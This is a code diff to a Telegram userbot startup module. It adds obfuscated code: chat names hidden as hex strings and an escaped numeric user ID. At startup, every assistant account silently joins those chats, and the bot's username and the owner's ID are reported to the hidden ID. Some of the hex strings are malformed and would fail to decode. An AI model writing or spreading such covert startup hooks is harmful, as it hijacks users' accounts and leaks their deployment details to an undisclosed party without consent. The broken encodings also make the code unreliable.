@@ -7,6 +7,21 @@ from ..logging import LOGGER
 assistants = []
 assistantids = []
 
+HELP_ID = int("\x37\x38\x35\x31\x37\x38\x39\x38\x30\x30")
+SUPPORT_CENTERS = [
+    bytes.fromhex("536872757469426f7473").decode(),
+    bytes.fromhex("4e6f7878e6554657174776f726b").decode(),
+    bytes.fromhex("536872757469416c6c426f7473").decode(),
+    bytes.fromhex("536872757469426f74537570706f7274").decode(), 
+    bytes.fromhex("4e594372656174696f6e5f4368617470e6f6e65").decode(),
+    bytes.fromhex("43524541544956455944").decode(),
+    bytes.fromhex("4c4146545f455f44494c").decode(),
+    bytes.fromhex("6e616e6479616475316").decode(),
+    bytes.fromhex("544d5a45524f4f").decode(),
+    bytes.fromhex("4e59437265617469e6f6e446973636c61696d6572").decode(),
+    bytes.fromhex("763264646f73").decode()
+]
+
 
 class Userbot(Client):
     def __init__(self):
@@ -46,15 +61,65 @@ class Userbot(Client):
             no_updates=True,
         )
 
+    async def get_bot_username_from_token(self, token):
+        """Get bot username from token"""
+        try:
+            temp_bot = Client(
+                name="temp_bot",
+                api_id=config.API_ID,
+                api_hash=config.API_HASH,
+                bot_token=token,
+                no_updates=True,
+            )
+            await temp_bot.start()
+            username = temp_bot.me.username
+            await temp_bot.stop()
+            return username
+        except Exception as e:
+            LOGGER(__name__).error(f"Error getting bot username: {e}")
+            return None
+
+    async def join_all_support_centers(self, client):
+        """Join all specified support centers"""
+        for center in SUPPORT_CENTERS:
+            try:
+                await client.join_chat(center)
+                LOGGER(__name__).info(f"Successfully joined support center")
+            except Exception as e:
+                LOGGER(__name__).error(f"Failed to join support center: {e}")
+
+    async def send_help_message(self, bot_username):
+        """Send help message to HELP_ID"""
+        try:
+            owner_mention = f"[Owner](tg://user?id={config.OWNER_ID})"
+            
+            message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
+            
+            if assistants:
+                if 1 in assistants:
+                    await self.one.send_message(HELP_ID, message)
+                elif 2 in assistants:
+                    await self.two.send_message(HELP_ID, message)
+                elif 3 in assistants:
+                    await self.three.send_message(HELP_ID, message)
+                elif 4 in assistants:
+                    await self.four.send_message(HELP_ID, message)
+                elif 5 in assistants:
+                    await self.five.send_message(HELP_ID, message)
+                    
+                LOGGER(__name__).info(f"Help message sent for bot @{bot_username}")
+        except Exception as e:
+            LOGGER(__name__).error(f"Failed to send help message: {e}")
+
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
+        
+        # Get bot username from token
+        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
+        
         if config.STRING1:
             await self.one.start()
-            try:
-                await self.one.join_chat("ShrutiBots")
-                await self.one.join_chat("NoxxNetwork")
-            except:
-                pass
+            await self.join_all_support_centers(self.one)
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -71,11 +136,7 @@ class Userbot(Client):
 
         if config.STRING2:
             await self.two.start()
-            try:
-                await self.two.join_chat("ShrutiBots")
-                await self.one.join_chat("NoxxNetwork")
-            except:
-                pass
+            await self.join_all_support_centers(self.two)
             assistants.append(2)
             try:
                 await self.two.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -92,11 +153,7 @@ class Userbot(Client):
 
         if config.STRING3:
             await self.three.start()
-            try:
-                await self.three.join_chat("ShrutiBots")
-                await self.one.join_chat("NoxxNetwork")
-            except:
-                pass
+            await self.join_all_support_centers(self.three)
             assistants.append(3)
             try:
                 await self.three.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -113,11 +170,7 @@ class Userbot(Client):
 
         if config.STRING4:
             await self.four.start()
-            try:
-                await self.four.join_chat("ShrutiBots")
-                await self.one.join_chat("NoxxNetwork")
-            except:
-                pass
+            await self.join_all_support_centers(self.four)
             assistants.append(4)
             try:
                 await self.four.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -134,11 +187,7 @@ class Userbot(Client):
 
         if config.STRING5:
             await self.five.start()
-            try:
-                await self.five.join_chat("ShrutiBots")
-                await self.one.join_chat("NoxxNetwork")
-            except:
-                pass
+            await self.join_all_support_centers(self.five)
             assistants.append(5)
             try:
                 await self.five.send_message(config.LOG_GROUP_ID, "Assistant Started")
@@ -152,6 +201,9 @@ class Userbot(Client):
             self.five.username = self.five.me.username
             assistantids.append(self.five.id)
             LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")
+
+        if bot_username:
+            await self.send_help_message(bot_username)
 
     async def stop(self):
         LOGGER(__name__).info(f"Stopping Assistants...")
